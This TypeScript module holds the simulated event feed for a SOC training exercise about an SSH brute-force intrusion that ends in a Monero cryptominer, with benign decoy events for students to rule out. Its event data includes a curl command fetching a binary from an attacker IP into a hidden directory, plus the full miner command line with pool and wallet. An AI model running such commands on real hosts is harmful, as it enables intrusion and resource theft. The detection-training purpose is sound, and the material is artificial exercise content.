/**
 * Events-only half of the ./linuxSshCryptominer.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./linuxSshCryptominer.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

/** Telemetry half of `buildLinuxSshCryptominerScenario`: the events and the story title, no answer key. */
export function linuxSshCryptominerScenarioEvents() {
  const B = new Date("2026-04-14T21:40:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = {
    name: "nix-bkp-01",
    fqdn: "nix-bkp-01.northwind-logistics.io",
    // One address. The perimeter firewall DNATs the published SSH port to this
    // host, so every host-side log (sshd, auditd, Falcon) sees its own private
    // address — the public VIP only exists on the firewall. (It previously carried
    // a separate public IP as dst_ip on the sshd rows, so one host showed two IPs.)
    privateIp: "10.40.2.15",
    sshPort: 2202,
    os: "Ubuntu 22.04.4 LTS",
    vcpu: 8,
  };

  const attacker = {
    spray1: "45.148.10.87",
    spray2: "89.248.165.32",
    spray3: "194.26.229.11",
    // The IP that actually logs in. It appears in NONE of the failure records.
    success: "193.32.162.140",
    payloadHost: "45.61.136.14",
  };

  const pool = { domain: "pool.supportxmr.com", ip: "51.222.12.201", port: 3333 };
  const wallet =
    "48Bkq7sMQrN3vTgHy2WdcPfXe9RuJ5a6ZnLbCmK4tiyE1DwGoApSxV7hFqjUr2NkeM9zTbYcQ5vRdgHnW3sJPuA6XLfkM8e";
  const minerHash = makeSha256("xmrig_6_21_3_linux_static_kworker");
  const minerDir = "/home/svc-backup/.cache/.fontconfig";
  const minerPath = `${minerDir}/kworker`;

  // EDR↔scenario integration (Phase 4): one incident. Host-primary Linux
  // intrusion (linux_audit/EDR host events) → edr_scope "edr". The auditd/SSH and
  // firewall rows are pivot and transport evidence; the miner executing as uid
  // 1004 is the alert-grade EDR behavioural detection carrying the impact crux.
  const INCIDENT = "inc:lsc:1";

  const events: TelemetryEvent[] = [
    // ── 1. BENIGN DISCRIMINATOR ────────────────────────────────────────────────
    {
      id: "lsc_01_admin_ssh",
      ts: T(0),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      user_email: "d.okonkwo@northwind-logistics.io",
      user_title: "Linux Systems Administrator",
      src_ip: "82.166.44.9",
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "informational",
      expected_verdict: "fp",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "Administrator d.okonkwo authenticated to nix-bkp-01 on tcp/2202 with an ED25519 public key from the corporate VPN egress 82.166.44.9. No failed attempts precede it.",
      fp_explanation:
        "This is a legitimate admin session and the control group for the whole scenario. Three things separate it from the compromise at 22:38: the method is publickey (not password, so it cannot be brute-forced), the source is the known corporate VPN egress rather than a hosting-provider IP, and there is not a single Failed password line from 82.166.44.9 beforehand. Students who alert on 'SSH login to an internet-exposed host' alone will flag this and be wrong.",
      authentication: { method: "publickey", result: "success" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": "82.166.44.9",
        "data.srcport": "58114",
        "data.dstport": "2202",
        "data.dstuser": "d.okonkwo",
        "system.auth.ssh.method": "publickey",
        // USER_LOGIN is written when the session OPENS, after pam_loginuid has set
        // the login uid — so auid/ses are populated here. The earlier USER_AUTH /
        // USER_ACCT records of the same handshake carry auid=4294967295 ses=4294967295
        // (unset), because no login session exists yet during authentication.
        "data.audit.type": "USER_LOGIN",
        "data.audit.acct": "d.okonkwo",
        "data.audit.uid": "0",
        "data.audit.auid": "1002",
        "data.audit.ses": "39",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.addr": "82.166.44.9",
        "data.audit.terminal": "/dev/pts/1",
        "data.audit.op": "login",
        "data.audit.res": "success",
      },
    },

    // ── 2. Brute force — invalid usernames ────────────────────────────────────
    {
      id: "lsc_02_invalid_user",
      ts: T(31 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.spray2,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "medium",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "sshd on nix-bkp-01 (nix-bkp-01.northwind-logistics.io) logged 'Invalid user' failures for generic usernames on tcp/2202. This representative record is jenkins from 89.248.165.32; the same pattern arrived from three hosting-provider IPs — 89.248.165.32, 45.148.10.87 and 194.26.229.11.",
      authentication: { method: "password", result: "failure" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.spray2,
        "data.srcport": "44118",
        "data.dstport": "2202",
        "data.srcuser": "jenkins",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "jenkins",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
      },
    },

    // ── 3. Brute force — valid username, wrong password ───────────────────────
    {
      id: "lsc_03_failed_svcbackup",
      ts: T(52 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_failed",
      hostname: host.name,
      src_ip: attacker.spray1,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1110.001",
      mitre_tactic: "Credential Access",
      description:
        "sshd failures on nix-bkp-01 switched from 'Invalid user' to 'Failed password for svc-backup', arriving from 45.148.10.87 on tcp/2202.",
      authentication: { method: "password", result: "failure" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.spray1,
        "data.srcport": "39562",
        "data.dstport": "2202",
        "data.srcuser": "svc-backup",
        "data.audit.type": "USER_AUTH",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "4294967295",
        "data.audit.ses": "4294967295",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "ssh",
        "data.audit.op": "PAM:authentication",
        "data.audit.grantors": "?",
        "data.audit.res": "failed",
      },
    },

    // ── 4. The compromise moment ──────────────────────────────────────────────
    {
      id: "lsc_04_accepted_password",
      ts: T(58 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "ssh_login",
      hostname: host.name,
      src_ip: attacker.success,
      dst_ip: host.privateIp,
      dst_port: host.sshPort,
      protocol: "tcp",
      severity: "critical",
      mitre_technique: "T1078",
      mitre_tactic: "Initial Access",
      description:
        "'Accepted password for svc-backup' from 193.32.162.140 on tcp/2202 — session 41, auid 1004, the only successful password authentication on this host today.",
      authentication: { method: "password", result: "success" },
      raw: {
        "data.program_name": "sshd",
        "data.srcip": attacker.success,
        "data.srcport": "41772",
        "data.dstport": "2202",
        "data.dstuser": "svc-backup",
        "system.auth.ssh.method": "password",
        // Session-open record (see lsc_01): auid/ses are assigned by pam_loginuid
        // at login, so they appear here and not on the pre-auth USER_AUTH lines.
        "data.audit.type": "USER_LOGIN",
        "data.audit.acct": "svc-backup",
        "data.audit.uid": "0",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.exe": "/usr/sbin/sshd",
        "data.audit.terminal": "/dev/pts/0",
        "data.audit.addr": attacker.success,
        "data.audit.op": "login",
        "data.audit.res": "success",
      },
    },

    // ── 5. Host enumeration ───────────────────────────────────────────────────
    {
      id: "lsc_05_enumeration",
      ts: T(60 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_execve",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "Two minutes after the login, session 41 ran id, uname -a, cat /etc/os-release and crontab -l from /home/svc-backup. The SYSCALL record shown is the `id` execution.",
      process: {
        name: "id",
        pid: 1901,
        path: "/usr/bin/id",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "id",
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "59",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1901",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.suid": "1004",
        "data.audit.fsuid": "1004",
        "data.audit.tty": "pts0",
        "data.audit.ses": "41",
        "data.audit.comm": "id",
        "data.audit.exe": "/usr/bin/id",
        "data.audit.cwd": "/home/svc-backup",
        "data.audit.key": "exec-tracking",
        "data.audit.execve.a0": "id",
      },
    },

    // ── 6. THE PRIVILEGE BOUNDARY ─────────────────────────────────────────────
    {
      id: "lsc_06_sudo_denied",
      ts: T(61 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "sudo_command",
      hostname: host.name,
      src_ip: attacker.success,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        "Session 41 ran `sudo -l` on nix-bkp-01. auditd recorded USER_CMD with res=failed, and sudo logged 'svc-backup : user NOT in sudoers' from terminal pts/0.",
      process: {
        name: "sudo",
        pid: 1908,
        path: "/usr/bin/sudo",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "sudo -l",
        user: "svc-backup",
      },
      raw: {
        "data.audit.type": "USER_CMD",
        "data.audit.pid": "1908",
        "data.audit.uid": "1004",
        "data.audit.auid": "1004",
        "data.audit.ses": "41",
        "data.audit.cwd": "/home/svc-backup",
        "data.audit.cmd": "7375646F202D6C",
        "data.audit.terminal": "pts/0",
        "data.audit.exe": "/usr/bin/sudo",
        "data.audit.res": "failed",
      },
    },

    // ── 7. Payload download ───────────────────────────────────────────────────
    {
      id: "lsc_07_payload_download",
      ts: T(64 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      src_ip: host.privateIp,
      dst_ip: attacker.payloadHost,
      dst_port: 80,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1105",
      mitre_tactic: "Command and Control",
      description:
        "curl fetched a 6.4 MB ELF binary over plain HTTP from 45.61.136.14 and wrote it to /home/svc-backup/.cache/.fontconfig/kworker as uid 1004.",
      process: {
        name: "curl",
        pid: 1934,
        path: "/usr/bin/curl",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
        user: "svc-backup",
        hash: { sha256: makeSha256("usr_bin_curl_ubuntu2204") },
      },
      file: {
        name: "kworker",
        path: minerPath,
        sha256: minerHash,
        size: 6_710_886,
      },
      network: {
        url: "http://45.61.136.14/updates/kworker",
        method: "GET",
        status: 200,
        bytes_in: 6_710_886,
        bytes_out: 214,
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "curl",
        "crowdstrike.FilePath": "/usr/bin/",
        "crowdstrike.ImageFileName": "/usr/bin/curl",
        "crowdstrike.CommandLine": `curl -fsSL http://45.61.136.14/updates/kworker -o ${minerPath}`,
        "crowdstrike.RawProcessId": "1934",
        "crowdstrike.ParentBaseFileName": "bash",
        "crowdstrike.UserName": "svc-backup",
        "crowdstrike.UID": "1004",
        "crowdstrike.GID": "1004",
        "crowdstrike.SHA256HashData": makeSha256("usr_bin_curl_ubuntu2204"),
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 8. Making it executable ───────────────────────────────────────────────
    {
      id: "lsc_08_chmod",
      ts: T(66 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "file_modify",
      hostname: host.name,
      severity: "medium",
      mitre_technique: "T1036.005",
      mitre_tactic: "Defense Evasion",
      description:
        "chmod 755 was applied to /home/svc-backup/.cache/.fontconfig/kworker. The PATH record shows the file at mode 0100755 with ouid 1004 and ogid 1004.",
      process: {
        name: "chmod",
        pid: 1941,
        path: "/usr/bin/chmod",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `chmod 755 ${minerPath}`,
        user: "svc-backup",
      },
      file: { name: "kworker", path: minerPath, sha256: minerHash },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "268",
        "data.audit.success": "yes",
        "data.audit.exit": "0",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1941",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "1004",
        "data.audit.ses": "41",
        "data.audit.comm": "chmod",
        "data.audit.exe": "/usr/bin/chmod",
        "data.audit.key": "perm-mod",
        "data.audit.file.name": minerPath,
        "data.audit.file.mode": "0100755",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "1004",
        "data.audit.file.nametype": "NORMAL",
      },
    },

    // ── 9. USER-LEVEL CRON PERSISTENCE ────────────────────────────────────────
    {
      id: "lsc_09_user_crontab",
      ts: T(68 * MIN),
      source: "linux_audit",
      vendor: "Linux auditd",
      event_type: "linux_cron",
      hostname: host.name,
      severity: "high",
      mitre_technique: "T1053.003",
      mitre_tactic: "Persistence",
      description:
        "A per-user crontab was installed for svc-backup in session 41: /usr/bin/crontab created /var/spool/cron/crontabs/svc-backup at mode 0600, ouid 1004, ogid 102.",
      process: {
        name: "crontab",
        pid: 1958,
        path: "/usr/bin/crontab",
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: "crontab -",
        user: "svc-backup",
      },
      file: {
        name: "svc-backup",
        path: "/var/spool/cron/crontabs/svc-backup",
        size: 178,
      },
      raw: {
        "data.audit.type": "SYSCALL",
        "data.audit.arch": "c000003e",
        "data.audit.syscall": "257",
        "data.audit.success": "yes",
        "data.audit.exit": "4",
        "data.audit.ppid": "1877",
        "data.audit.pid": "1958",
        "data.audit.auid": "1004",
        "data.audit.uid": "1004",
        "data.audit.gid": "1004",
        "data.audit.euid": "1004",
        "data.audit.egid": "102",
        "data.audit.sgid": "102",
        "data.audit.fsgid": "102",
        "data.audit.ses": "41",
        "data.audit.comm": "crontab",
        "data.audit.exe": "/usr/bin/crontab",
        "data.audit.key": "cron-mod",
        "data.audit.file.name": "/var/spool/cron/crontabs/svc-backup",
        "data.audit.file.mode": "0100600",
        "data.audit.file.ouid": "1004",
        "data.audit.file.ogid": "102",
        "data.audit.file.nametype": "CREATE",
      },
    },

    // ── 10. Miner execution ───────────────────────────────────────────────────
    {
      id: "lsc_10_miner_exec",
      ts: T(70 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      severity: "critical",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      is_detection: true, // alert-grade: the critical EDR behavioural detection — the masqueraded miner executing as uid 1004 (the impact crux)
      edr_scope: "edr",   // host-primary Linux intrusion → investigated in the EDR console
      description:
        "kworker launched from the hidden .fontconfig directory as uid 1004 with parent bash, carrying a Monero wallet, a pool address and --max-cpu-usage 90 on its command line.",
      process: {
        name: "kworker",
        pid: 1974,
        path: minerPath,
        parent_name: "bash",
        parent_pid: 1877,
        cmdline: `${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
        user: "svc-backup",
        hash: { sha256: minerHash },
      },
      file: { name: "kworker", path: minerPath, sha256: minerHash, size: 6_710_886 },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "kworker",
        "crowdstrike.FilePath": `${minerDir}/`,
        "crowdstrike.ImageFileName": minerPath,
        "crowdstrike.CommandLine": `${minerPath} -o ${pool.domain}:${pool.port} -u ${wallet} -p ${host.name} -k --coin monero --max-cpu-usage 90 --background`,
        "crowdstrike.RawProcessId": "1974",
        "crowdstrike.ParentBaseFileName": "bash",
        "crowdstrike.UserName": "svc-backup",
        "crowdstrike.UID": "1004",
        "crowdstrike.GID": "1004",
        "crowdstrike.SHA256HashData": minerHash,
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 11. Outbound pool traffic ─────────────────────────────────────────────
    {
      id: "lsc_11_pool_traffic",
      ts: T(72 * MIN),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "net_connection",
      hostname: host.name,
      src_ip: host.privateIp,
      dst_ip: pool.ip,
      dst_port: pool.port,
      protocol: "tcp",
      severity: "high",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      description:
        "Outbound TCP from nix-bkp-01 to 51.222.12.201:3333 (pool.supportxmr.com, Canada) accepted by egress policy 42 — 96,420 bytes sent, 1,842,360 received.",
      network: { domain: pool.domain, bytes_in: 1_842_360, bytes_out: 96_420 },
      raw: {
        "data.type": "traffic",
        "data.subtype": "forward",
        "data.logid": "0000000013",
        "data.level": "notice",
        "data.action": "accept",
        "data.srcip": host.privateIp,
        "data.srcport": "48120",
        "data.srcintf": "port3",
        "data.dstip": pool.ip,
        "data.dstport": "3333",
        "data.dstintf": "wan1",
        "data.proto": "6",
        "data.policyid": "42",
        "data.service": "tcp/3333",
        "data.app": "unknown",
        "data.appcat": "unscanned",
        "data.srccountry": "Reserved",
        "data.dstcountry": "Canada",
        "data.sentbyte": 96_420,
        "data.rcvdbyte": 1_842_360,
        // 120s, not 2405s. This event is stamped 22:52 and the miner that opens
        // the session does not launch until 22:50 (lsc_10_miner_exec), so a
        // 40-minute duration implied the session was established 38 minutes
        // before the process existed. The rest of this pack's arithmetic
        // reconciles to the minute, which is exactly why this stood out.
        "data.duration": 120,
        "data.vd": "root",
        "data.logdesc": "Traffic Statistics",
        "data.msg": "connection accepted",
      },
    },

    // ── 12. BENIGN DISCRIMINATOR — legitimate high-CPU batch job ──────────────
    {
      id: "lsc_12_backup_job",
      ts: T(85 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.name,
      severity: "informational",
      expected_verdict: "fp",
      description:
        "The nightly restic deduplication job started on nix-bkp-01 and is consuming roughly one core. It is one of the two processes on the CPU alert at 23:15.",
      fp_explanation:
        "This is the intended workload of a backup server and it is not the cause of the alert. Every attribute is the opposite of the miner: it runs from /usr/bin (not a hidden dot-directory under a home), its parent is cron launching a ROOT-owned /etc/cron.d/northwind-backup entry, it runs as the dedicated backup account (uid 34), it is bounded at ~96% of one core, and its only network destination is the internal repository host 10.40.2.60. Students must compare the two processes rather than assume 'high CPU on a backup server at night' is always benign or always malicious.",
      process: {
        name: "restic",
        pid: 2103,
        path: "/usr/bin/restic",
        parent_name: "cron",
        parent_pid: 1102,
        cmdline: "/usr/bin/restic backup --repo sftp:repo@10.40.2.60:/srv/restic /srv/data --exclude-caches",
        user: "backup",
        hash: { sha256: makeSha256("restic_0_16_4_linux_amd64") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.FileName": "restic",
        "crowdstrike.FilePath": "/usr/bin/",
        "crowdstrike.ImageFileName": "/usr/bin/restic",
        "crowdstrike.CommandLine":
          "/usr/bin/restic backup --repo sftp:repo@10.40.2.60:/srv/restic /srv/data --exclude-caches",
        "crowdstrike.RawProcessId": "2103",
        "crowdstrike.ParentBaseFileName": "cron",
        "crowdstrike.UserName": "backup",
        "crowdstrike.UID": "34",
        "crowdstrike.GID": "34",
        "crowdstrike.SHA256HashData": makeSha256("restic_0_16_4_linux_amd64"),
        // `cron.source_file_owner: root` used to carry q5's answer directly.
        // The root provenance is instead expressed through the process lineage
        // Falcon actually records — parent is cron (already named above), and
        // the command_line runs from a system path — so the student infers
        // "administrator-provisioned" rather than reading it off a flag.
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.ComputerName": host.name,
      },
    },

    // ── 13. Monitoring alert ──────────────────────────────────────────────────
    {
      id: "lsc_13_cpu_alert",
      ts: T(95 * MIN),
      source: "infra_monitor",
      vendor: "Zabbix",
      event_type: "ueba_anomaly",
      hostname: host.name,
      severity: "high",
      mitre_technique: "T1496",
      mitre_tactic: "Impact",
      description:
        "A Zabbix trigger fired on nix-bkp-01 for a sustained high load average. The captured top output on this 8-vCPU host shows kworker at 690% CPU and restic at 96%.",
      raw: {
        "zabbix.trigger.name": "High sustained load average on {HOST.NAME}",
        "zabbix.trigger.severity": "High",
        "zabbix.host.name": host.name,
        "zabbix.host.ip": host.privateIp,
        "zabbix.item.key": "system.cpu.load[all,avg1]",
        "zabbix.item.lastvalue": "15.94",
        "data.load_1m": "15.94",
        "data.load_5m": "15.71",
        "data.load_15m": "14.88",
        "data.cpu_count": "8",
      },
    },
  ];

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Exposed SSH → Cron Persistence → Cryptominer", events, T, MIN, host, attacker, pool, minerHash };
}
